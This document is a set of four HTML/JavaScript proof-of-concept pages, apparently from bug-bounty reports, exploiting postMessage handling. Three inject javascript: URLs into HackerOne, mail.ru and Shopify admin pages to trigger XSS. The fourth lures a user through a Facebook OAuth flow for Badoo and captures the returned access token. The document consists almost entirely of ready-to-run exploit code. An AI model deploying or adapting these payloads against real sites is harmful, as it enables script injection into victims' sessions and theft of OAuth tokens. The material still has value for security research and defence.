<!DOCTYPE html>
<html>
	<head>
		<title>Hackerone PostMessage XSS</title>
	</head>
	<body>
		<p>You want to contact Hackerone! Click this button and submit the form!</p>
		<button id="openH1">Click Here</button>
		<script>
			var h1Win;

			function openWin(){
				h1Win = window.open("https://www.hackerone.com/#contact/");
				setInterval(sendMessage, 250);
			}

			function sendMessage(){
				h1Win.postMessage('{"mktoResponse":{"for":"mktoFormMessage0","error":false,"data":{"formId":"1013","followUpUrl":"javascript:alert(document.domain);//","aliId":17144124}}}',"*");
			}

			document.getElementById("openH1").addEventListener('click', openWin);
		</script>
	</body>
</html>


#########################################


<a href="#" onclick="xss()">click me</a>
    <script>
function xss() {
    var win = window.open('https://account.mail.ru/login', '_blank');
    setTimeout(function() {
        win.postMessage('__cors__{"__cors__":"foo","cmd":"click:extauth","data":"javascript:alert`XSS`"}', '*');
    }, 500);
}
    </script>
###########################################
<script>
  function attack(){
    var ctx=window.open(location.origin+'/admin/themes','_blank');
    var interval;
    interval=setInterval(function(){
      if(window.attackSuccess){
        clearInterval(interval);
      }else{
        ctx.postMessage(`{"message":"Shopify.API.remoteRedirect","data":{"location":"javascript:alert(document.domain)"}}`);
      }
    },500);;
  }
  attack();
</script>
<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>

###########################################

<!DOCTYPE>
<html>
  <head>
  </head>
  <body>
    <div id="message">
    </div>
    <a href="#" onclick="window.open('https://www.facebook.com/v2.0/dialog/oauth?redirect_uri=https%3A%2F%2Fmus1.badoo.com%2Fcb.html%3Fflow%3Dauth%26provider%3D1&scope=public_profile%2Cemail%2Cuser_friends%2Cuser_photos%2Cuser_work_history%2Cuser_education_history%2Cuser_location%2Cuser_birthday%2Cuser_likes&response_type=token&auth_type=rerequest&client_id=107433747809&_rdr')">
      Click Here
    </a>
    <script>
    function listener(event) {
      document.getElementById("message").innerHTML = "Your token for Facebook is "+ event.data.token;
    }
    if (window.addEventListener){
      addEventListener("message", listener, false);
    } else {
      attachEvent("onmessage", listener);
    }
    </script>
  </body>
</html>
#############################################
